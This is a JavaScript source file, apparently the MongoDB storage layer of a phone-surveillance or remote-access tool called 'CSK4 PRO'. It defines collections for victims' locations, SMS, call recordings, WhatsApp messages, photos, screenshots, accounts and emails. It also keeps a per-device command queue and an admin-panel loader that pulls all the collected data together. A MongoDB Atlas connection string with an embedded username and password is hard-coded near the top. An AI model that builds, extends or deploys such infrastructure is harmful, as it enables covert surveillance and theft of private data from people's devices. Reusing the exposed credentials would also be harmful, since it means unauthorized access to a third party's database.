// ============================================
// CSK4 PRO v4.0 - MongoDB Connection
// ============================================
// Ye file MongoDB Atlas se connect karti hai
// Aur saara data permanently save karti hai
// ============================================

const { MongoClient } = require('mongodb');

// ============ CONFIG ============
const MONGODB_URI = process.env.MONGODB_URI || 
  'mongodb+srv://cryptixshadowkernel_db_user:Lqi6bk5rPUEK3ulL@cluster0.e0vrp5z.mongodb.net/csk4?retryWrites=true&w=majority';

const DB_NAME = 'csk4';

// ============ CLIENT ============
let client = null;
let db = null;
let isConnected = false;

// ============ COLLECTIONS ============
const COLLECTIONS = {
  DEVICES: 'devices',
  LOCATIONS: 'locations',
  CONTACTS: 'contacts',
  FILES: 'files',
  PHOTOS: 'photos',
  VIDEOS: 'videos',
  AUDIO: 'audio',
  MESSAGES: 'messages',
  CALL_LOGS: 'callLogs',
  CALL_RECORDINGS: 'callRecordings',
  APPS: 'apps',
  SCREENSHOTS: 'screenshots',
  BLUETOOTH: 'bluetooth',
  NOTIFICATIONS: 'notifications',
  WHATSAPP: 'whatsapp',
  ACTIVITIES: 'activities',
  SIM_INFO: 'simInfo',
  ACCOUNTS: 'accounts',
  EMAILS: 'emails',
  COMMANDS: 'commands',
  DEVICE_INFO: 'deviceInfo'
};

// ============ CONNECT ============
async function connect() {
  if (isConnected && client && db) {
    return db;
  }

  try {
    console.log('🔌 Connecting to MongoDB...');
    
    client = new MongoClient(MONGODB_URI, {
      maxPoolSize: 10,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000,
    });

    await client.connect();
    db = client.db(DB_NAME);
    
    // Test connection
    await db.command({ ping: 1 });
    
    isConnected = true;
    console.log('✅ MongoDB connected successfully');
    console.log(`   Database: ${DB_NAME}`);
    
    // Create indexes for performance
    await createIndexes();
    
    return db;
  } catch (error) {
    console.error('❌ MongoDB connection failed:', error.message);
    isConnected = false;
    throw error;
  }
}

// ============ CREATE INDEXES ============
async function createIndexes() {
  try {
    const db = client.db(DB_NAME);
    
    // Devices - unique deviceId
    await db.collection(COLLECTIONS.DEVICES).createIndex(
      { deviceId: 1 }, { unique: true }
    );
    
    // Locations - device + time for fast queries
    await db.collection(COLLECTIONS.LOCATIONS).createIndex(
      { deviceId: 1, time: -1 }
    );
    
    // Messages - device + time
    await db.collection(COLLECTIONS.MESSAGES).createIndex(
      { deviceId: 1, time: -1 }
    );
    
    // Contacts - device
    await db.collection(COLLECTIONS.CONTACTS).createIndex(
      { deviceId: 1, phone: 1 }
    );
    
    // Notifications - device + time
    await db.collection(COLLECTIONS.NOTIFICATIONS).createIndex(
      { deviceId: 1, time: -1 }
    );
    
    // WhatsApp - device + time
    await db.collection(COLLECTIONS.WHATSAPP).createIndex(
      { deviceId: 1, time: -1 }
    );
    
    // Activities - device + time
    await db.collection(COLLECTIONS.ACTIVITIES).createIndex(
      { deviceId: 1, time: -1 }
    );
    
    // Commands - device + status
    await db.collection(COLLECTIONS.COMMANDS).createIndex(
      { deviceId: 1, status: 1 }
    );
    
    // Calls - device + time
    await db.collection(COLLECTIONS.CALL_LOGS).createIndex(
      { deviceId: 1, time: -1 }
    );
    
    console.log('✅ MongoDB indexes created');
  } catch (error) {
    console.error('⚠️ Index creation error:', error.message);
  }
}

// ============ GET DB ============
function getDb() {
  if (!db) throw new Error('MongoDB not connected');
  return db;
}

// ============ SAVE FUNCTION (Universal) ============
async function save(collection, data) {
  try {
    const database = getDb();
    const result = await database.collection(collection).insertOne({
      ...data,
      createdAt: new Date()
    });
    return result;
  } catch (error) {
    console.error(`❌ Save error (${collection}):`, error.message);
    throw error;
  }
}

// ============ SAVE MANY ============
async function saveMany(collection, dataArray) {
  try {
    if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
    const database = getDb();
    const result = await database.collection(collection).insertMany(
      dataArray.map(item => ({ ...item, createdAt: new Date() }))
    );
    return result;
  } catch (error) {
    console.error(`❌ SaveMany error (${collection}):`, error.message);
    throw error;
  }
}

// ============ UPDATE ONE (upsert) ============
async function updateOne(collection, filter, data) {
  try {
    const database = getDb();
    const result = await database.collection(collection).updateOne(
      filter,
      { 
        $set: { ...data, updatedAt: new Date() },
        $setOnInsert: { createdAt: new Date() }
      },
      { upsert: true }
    );
    return result;
  } catch (error) {
    console.error(`❌ Update error (${collection}):`, error.message);
    throw error;
  }
}

// ============ FIND ============
async function find(collection, filter = {}, options = {}) {
  try {
    const database = getDb();
    let cursor = database.collection(collection).find(filter);
    
    if (options.sort) cursor = cursor.sort(options.sort);
    if (options.limit) cursor = cursor.limit(options.limit);
    if (options.skip) cursor = cursor.skip(options.skip);
    
    return await cursor.toArray();
  } catch (error) {
    console.error(`❌ Find error (${collection}):`, error.message);
    return [];
  }
}

// ============ FIND ONE ============
async function findOne(collection, filter) {
  try {
    const database = getDb();
    return await database.collection(collection).findOne(filter);
  } catch (error) {
    console.error(`❌ FindOne error (${collection}):`, error.message);
    return null;
  }
}

// ============ DELETE ============
async function remove(collection, filter) {
  try {
    const database = getDb();
    return await database.collection(collection).deleteMany(filter);
  } catch (error) {
    console.error(`❌ Delete error (${collection}):`, error.message);
    throw error;
  }
}

// ============ COUNT ============
async function count(collection, filter = {}) {
  try {
    const database = getDb();
    return await database.collection(collection).countDocuments(filter);
  } catch (error) {
    console.error(`❌ Count error (${collection}):`, error.message);
    return 0;
  }
}

// ============ GET STATS ============
async function getStats() {
  try {
    const database = getDb();
    const stats = {};
    
    for (const [name, coll] of Object.entries(COLLECTIONS)) {
      try {
        stats[name.toLowerCase()] = await database.collection(coll).countDocuments();
      } catch (e) {
        stats[name.toLowerCase()] = 0;
      }
    }
    
    return stats;
  } catch (error) {
    console.error('❌ Stats error:', error.message);
    return {};
  }
}

// ============ LOAD ALL DATA (for admin panel) ============
async function loadAllData() {
  try {
    const database = getDb();
    
    // Get latest data
    const [
      devices,
      locations,
      contacts,
      files,
      photos,
      videos,
      audio,
      messages,
      callLogs,
      callRecordings,
      apps,
      screenshots,
      bluetooth,
      notifications,
      whatsapp,
      activities,
      simInfo,
      accounts,
      emails,
      commands,
      deviceInfo
    ] = await Promise.all([
      database.collection(COLLECTIONS.DEVICES).find().toArray(),
      database.collection(COLLECTIONS.LOCATIONS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.CONTACTS).find().limit(5000).toArray(),
      database.collection(COLLECTIONS.FILES).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.PHOTOS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.VIDEOS).find().sort({ time: -1 }).limit(200).toArray(),
      database.collection(COLLECTIONS.AUDIO).find().sort({ time: -1 }).limit(200).toArray(),
      database.collection(COLLECTIONS.MESSAGES).find().sort({ time: -1 }).limit(2000).toArray(),
      database.collection(COLLECTIONS.CALL_LOGS).find().sort({ time: -1 }).limit(2000).toArray(),
      database.collection(COLLECTIONS.CALL_RECORDINGS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.APPS).find().limit(1000).toArray(),
      database.collection(COLLECTIONS.SCREENSHOTS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.BLUETOOTH).find().limit(500).toArray(),
      database.collection(COLLECTIONS.NOTIFICATIONS).find().sort({ time: -1 }).limit(1000).toArray(),
      database.collection(COLLECTIONS.WHATSAPP).find().sort({ time: -1 }).limit(1000).toArray(),
      database.collection(COLLECTIONS.ACTIVITIES).find().sort({ time: -1 }).limit(2000).toArray(),
      database.collection(COLLECTIONS.SIM_INFO).find().toArray(),
      database.collection(COLLECTIONS.ACCOUNTS).find().toArray(),
      database.collection(COLLECTIONS.EMAILS).find().toArray(),
      database.collection(COLLECTIONS.COMMANDS).find().sort({ time: -1 }).limit(500).toArray(),
      database.collection(COLLECTIONS.DEVICE_INFO).find().toArray()
    ]);
    
    // Convert devices array to object
    const devicesObj = {};
    devices.forEach(d => { devicesObj[d.deviceId] = d; });
    
    const simInfoObj = {};
    simInfo.forEach(s => { simInfoObj[s.deviceId] = s; });
    
    const accountsObj = {};
    accounts.forEach(a => { accountsObj[a.deviceId] = a; });
    
    const emailsObj = {};
    emails.forEach(e => { emailsObj[e.deviceId] = e; });
    
    const deviceInfoObj = {};
    deviceInfo.forEach(d => { deviceInfoObj[d.deviceId] = d; });
    
    return {
      devices: devicesObj,
      locations,
      contacts,
      files,
      photos,
      videos,
      audio,
      messages,
      callLogs,
      callRecordings,
      apps,
      screenshots,
      bluetooth,
      notifications,
      whatsapp,
      activities,
      simInfo: simInfoObj,
      accounts: accountsObj,
      emails: emailsObj,
      commands,
      deviceInfo: deviceInfoObj
    };
  } catch (error) {
    console.error('❌ LoadAll error:', error.message);
    return null;
  }
}

// ============ CLOSE ============
async function close() {
  if (client) {
    await client.close();
    isConnected = false;
    console.log('🔌 MongoDB connection closed');
  }
}

// ============ EXPORTS ============
module.exports = {
  connect,
  close,
  getDb,
  save,
  saveMany,
  updateOne,
  find,
  findOne,
  remove,
  count,
  getStats,
  loadAllData,
  COLLECTIONS,
  isConnected: () => isConnected
};
